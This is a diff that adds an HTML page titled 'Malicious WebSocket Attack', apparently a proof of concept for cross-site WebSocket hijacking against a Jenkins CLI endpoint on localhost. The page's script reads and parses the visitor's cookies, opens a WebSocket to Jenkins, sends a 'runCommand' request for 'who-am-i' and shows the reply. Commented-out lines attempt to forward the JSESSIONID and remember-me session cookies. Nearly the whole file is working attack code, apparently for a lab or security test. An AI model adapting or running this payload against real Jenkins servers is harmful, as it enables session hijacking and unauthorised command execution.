@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious WebSocket Attack</title>
+</head>
+
+<body>
+    <h1>WebSocket Attack in Progress...</h1>
+    <p>If you're reading this, your session is being hijacked!</p>
+
+    <script>
+        function hijackWebSocket() {
+            console.log("Cookies available in document.cookie: ", document.cookie);
+
+            const cookies = document.cookie;
+            console.log("Victim's cookies: ", cookies);
+
+            const cookieList = cookies.split(";").reduce((cookiesObj, cookie) => {
+                const [name, value] = cookie.split("=");
+                cookiesObj[name.trim()] = value;
+                return cookiesObj;
+            }, {});
+
+            console.log("Extracted cookies: ", cookieList);
+
+            // const jsessionid = cookieList['JSESSIONID'];
+            // const rememberMe = cookieList['remember-me'];
+
+            // if (!jsessionid || !rememberMe) {
+            //     console.log("Required cookies (JSESSIONID or remember-me) are missing.");
+            //     return;
+            // }
+
+            const targetUrl = "ws://localhost:8080/cli/ws/";
+
+            // Open the WebSocket connection with the custom Origin header
+            const socket = new WebSocket(targetUrl);
+
+            // Manually set the Origin header
+            socket.onopen = function () {
+                console.log("Connected to Jenkins WebSocket endpoint.");
+
+                // socket.send(JSON.stringify({
+                // "cookies": `JSESSIONID=${jsessionid}; remember-me=${rememberMe}`,
+
+                // setting headers this way won't work ig not sure
+                // "origin": "http://localhost:8080"
+                // }));
+
+
+                // Send cookies as part of the WebSocket message
+                socket.send(JSON.stringify({
+                    "action": "runCommand",
+                    "command": "who-am-i"
+                }));
+
+
+
+            };
+
+            socket.onmessage = function (event) {
+                console.log("Received response from Jenkins:", event.data);
+                document.body.innerHTML += `<p>Response from Jenkins: ${event.data}</p>`;
+            };
+
+            socket.onerror = function (error) {
+                console.error("WebSocket error:", error);
+            };
+
+            socket.onclose = function () {
+                console.log("WebSocket connection closed.");
+            };
+        }
+
+        hijackWebSocket();  
+    </script>
+</body>
+
+</html>
